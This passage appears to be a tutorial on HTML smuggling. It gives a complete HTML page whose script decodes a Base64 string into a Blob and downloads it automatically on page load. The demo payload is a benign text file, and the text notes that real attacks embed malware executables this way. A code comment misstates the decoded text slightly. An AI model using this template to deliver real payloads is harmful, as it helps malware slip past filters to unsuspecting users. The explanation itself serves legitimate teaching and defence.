### The Mechanism

The technique typically relies on three steps:
1.  **Encoding:** The payload is converted into a Base64 string to hide its structure and allow it to be transmitted as text.
2.  **Decoding:** JavaScript (running in the victim's browser) decodes the Base64 string back into binary data.
3.  **Execution/Download:** The JavaScript creates a `Blob` object from the binary data and triggers an automatic download or execution.

### Safe Demonstration

The following HTML code demonstrates this concept. It "smuggles" a simple text file that contains the message "Hello, this is a smuggled file."

You can save this code as an `.html` file and open it in your browser. It will automatically download a file named `smuggled_payload.txt`.

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>HTML Smuggling Demo</title>
</head>
<body>
    <h3>HTML Smuggling Demonstration</h3>
    <p>A file should download automatically.</p>

    <script>
        // 1. The Payload (Base64 encoded string)
        // The decoded text is: "Hello, this is a smuggled file."
        var base64Payload = "SGVsbG8sIHRoaXMgaXMgYSBzbWdnbGVkIGZpbGUu";

        function smugglePayload() {
            // 2. Decode the Base64 string into binary data
            var binaryString = window.atob(base64Payload);
            var len = binaryString.length;
            var bytes = new Uint8Array(len);

            for (var i = 0; i < len; i++) {
                bytes[i] = binaryString.charCodeAt(i);
            }

            // 3. Create a Blob (Binary Large Object) representing the file
            // 'application/octet-stream' is a generic binary file type
            var blob = new Blob([bytes], {type: "application/octet-stream"});

            // 4. Create a temporary link element to trigger the download
            var link = document.createElement('a');
            link.href = window.URL.createObjectURL(blob);
            link.download = "smuggled_payload.txt"; // The name of the file to be saved

            // Append to body (required for Firefox)
            document.body.appendChild(link);

            // Programmatically click the link
            link.click();

            // Cleanup
            document.body.removeChild(link);
        }

        // Execute the function when the page loads
        window.onload = smugglePayload;
    </script>
</body>
</html>
```

### Technical Breakdown

1.  **`window.atob()`**: This function decodes a string of data which has been encoded using Base64 encoding. In a real attack, this string would be massive, containing the full hex dump of a malware executable.
2.  **`Uint8Array`**: This creates a typed array representing the raw bytes of the file.
3.  **`Blob`**: The `Blob` object represents a file-like object of immutable, raw data. Browsers handle Blobs as files, allowing them to be saved even if they didn't come from a server.
4.  **`URL.createObjectURL()`**: This generates a temporary URL pointing to the Blob object (e.g., `blob:http://example.com/1234-5678`). This allows the `<a>` tag to reference the in-memory data as if it were a file on a server.

